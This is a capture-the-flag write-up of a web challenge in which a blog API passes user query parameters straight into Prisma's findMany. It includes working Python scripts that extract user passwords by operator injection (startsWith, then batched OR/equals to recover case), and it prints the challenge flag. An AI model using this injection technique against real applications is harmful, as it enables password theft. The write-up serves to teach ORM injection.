### Challenge Description

Here are API endpoints for a blog website.

[Challenge files](./blogs.zip)

### Overview

The challenge application is an api service that uses `Prisma ORM` to talk with an `SQLite` database. The database stores data into two tables named `posts` and `users`. The application gives access to all posts those have `pusblished : true` property via the `/api/posts` endpoint, and all posts of a particular user after login via the `/api/login` route.

 Here is the code in discussion for reference:
```js
app.get(
  "/api/posts",
  async (req, res) => {
    try {
      let query = req.query;
      query.published = true;
      let posts = await prisma.post.findMany({where: query});
      res.json({success: true, posts})
    } catch (error) {
      res.json({ success: false, error });
    }
  }
);

app.post(
    "/api/login",
    async (req, res) => {
        try {
            let {name, password} = req.body;
            let user = await prisma.user.findUnique({where:{
                    name: name
                },
                include:{
                    posts: true
                }
            });
            console.log(user)
            if (user.password === password) { 
                res.json({success: true, posts: user.posts});
            }
            else {
                res.json({success: false});
            }
        } catch (error) {
            console.error(error); 
            res.json({success: false, error});
        }
    }
)
```

The flag is in a `published:false` post assigned to a random user. So, to solve the challenge we have to extract the passwords of all the users and then log in and check if that user has the flag post or not.

### Solution

In our search for vulnerabilities of `Prisma ORM`, we stumbled upon [this article](https://www.elttam.com/blog/plorming-your-primsa-orm/#introduction).
It suggested that this part:
```js
let posts = await prisma.post.findMany({where: query});
```  
-- was vulnerable to injection attack. It had a similar example where an attack `Time-based Exploitation of Prisma` was explained, but we felt confused on how exactly to implement it, so we went on to make our own. 

While I was debugging the application locally, I found out that we could nest the query like `/api/posts/?[random][random][random]=a` and the resulting query would look like: 
```json
where:{
  { random: 
    { random:
      { random: 'a' } },
   published: true }
}

```
Seems intresting, now let's construct a payload that actually does mean something. After surfing through the Prisma docs and trying random stuff, I managed to make `api/posts/?[author][password][startsWith]=a` which would resolve the query to:

```json
where:{
  { author: 
    { password:
      { startsWith: 'a' } },
   published: true }
}
```
which basically filters the posts whose author's password starts from `a`. So we could just brute the password of a user char by char based on if the post of a particular authorId appears or not.
I automated the process using this python script:
```python
import requests

def leak_password():
    base_url = "http://35.239.207.1:3000/api/posts/"
    chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    password = ""
    while len(password) < 26:
        found = False
        for c in chars:
            params = {
                "OR[0][author][password][startsWith]": password + c
            }
            
            response = requests.get(base_url, params=params)
            data = response.json()
            
            if data.get("success") and data.get("posts"):
                password += c
                print(f"Found character {len(password)}: {c}")
                print(f"Password so far: {password}")
                found = True
                break
        
        if not found:
            print("No more characters found. Password complete.")
            break
            
    return password

if __name__ == "__main__":
    password = leak_password()
    print(f"Final password: {password}")
```

We did actually managed to extract all the passwords, but when we tried to log in, we couldn't ! 
Turns out `startsWith` is CASE-INSENSITIVE!! 😭


So now we have the password but case insensitively. We tried looking for case sensitive alternatives of `startsWith` (which was the intended solution) but we went on to something crawwsy 😂. 

I found out about the `OR` operator in `Prisma` and how it could be used to make conditional queries. Also `equals` could be used to make case sensitive comparisions. So we thought, what if we feed all the permutations of case in case insensitive version of password and run a binary search to narrow it down and find out the correct password? For example the query like `/api/posts?OR[0][author][password][equals]=8AXCgMish5Zn59rSXJM&OR[0][author][password][equals]=8AXCgMish5Zn59rSXJm` would resolve to:
```json

{ OR:
   [ 
      { author: 
        password:{
          startsWith : '8AXCgMish5Zn59rSXJM'
        }
       },
      { author: 
        password:{
          startsWith : '8AXCgMish5Zn59rSXJm'
        }
       },

       ...
    ],
   published: true }

```
Implementing that came with it's problems ofc, we ran out of request length trying to fit in all `OR` queries. So we did the same by breaking this into chunks and automated the process using this highly unoptimised script:

```python
import itertools
import requests
import time

BASE_URL = "http://35.239.207.1:3000/api/posts/"
PASSWORD = "8axcgmish5zn59rsxjm"
BATCH_SIZE = 20

def generate_case_permutations(password):
    return [''.join(perm) for perm in itertools.product(*[(c.lower(), c.upper()) if c.isalpha() else (c,) for c in password])]

def test_batch(permutations):
    params = {}
    for i, perm in enumerate(permutations):
        params[f"OR[{i}][author][password][equals]"] = perm
    
    try:
        response = requests.get(BASE_URL, params=params)
        if response.status_code == 200:
            data = response.json()
            print(data)
            return data.get("success") and data.get("posts")
    except Exception as e:
        print(f"\nError testing batch: {str(e)}")
        return False

def find_correct_in_batch(permutations):
    print("\nFound successful batch, testing individual passwords:")
    for i, perm in enumerate(permutations):
        params = {
            f"OR[{i}][author][password][equals]": perm
        }
        try:
            response = requests.get(BASE_URL, params=params)
            if response.status_code == 200:
                data = response.json()
                print(data)
                if data.get("success") and data.get("posts"):
                    return perm, i
        except Exception as e:
            print(f"Error testing {perm}: {str(e)}")
        print(f"Tested OR[{i}]: {perm}")
    return None, None

def find_password():
    print("Generating permutations...")
    permutations = generate_case_permutations(PASSWORD)
    total_perms = len(permutations)
    total_batches = (total_perms + BATCH_SIZE - 1) // BATCH_SIZE
    print(f"Testing {total_perms} permutations in {total_batches} batches of {BATCH_SIZE}")
    
    start_time = time.time()
    
    # Generate batch start positions in reverse order
    batch_starts = range(0, total_perms, BATCH_SIZE)
    batch_starts = list(batch_starts)[::-1]  # Reverse the range
    
    for batch_start in batch_starts:
        batch = permutations[batch_start:batch_start + BATCH_SIZE]
        current_batch = batch_start // BATCH_SIZE + 1
        elapsed = time.time() - start_time
        print(f"\rTesting batch {total_batches - current_batch + 1}/{total_batches} (perms {batch_start}-{min(batch_start+BATCH_SIZE, total_perms)}) using OR[0]-OR[{len(batch)-1}] - Elapsed: {elapsed:.1f}s", end="")
        
        if test_batch(batch):
            correct_password, index = find_correct_in_batch(batch)
            if correct_password:
                return correct_password, index, current_batch, batch_start
    
    return None, None, None, None

if __name__ == "__main__":
    print(f"Starting batch password search for: {PASSWORD}")
    letter_count = sum(1 for c in PASSWORD if c.isalpha())
    print(f"Number of letters: {letter_count}")
    print(f"Total permutations: {2 ** letter_count}")
    
    password, index, batch_num, batch_start = find_password()
    if password:
        print(f"\nFound correct password '{password}' at OR[{index}] in batch {batch_num}")
        print(f"This was permutation {batch_start + index + 1} overall")
    else:
        print("\nNo matching password found")
```

It worked! We extracted the passwords, logged in and the flag was in the second user we extracted.

`uoftctf{u51n6_0rm5_d035_n07_m34n_1nj3c710n5_c4n7_h4pp3n}`

### Intended Solution

The intended solution involved `lte` and `gte` in Prisma to compare ASCII values and find out the case but nvm, ours was more fun :)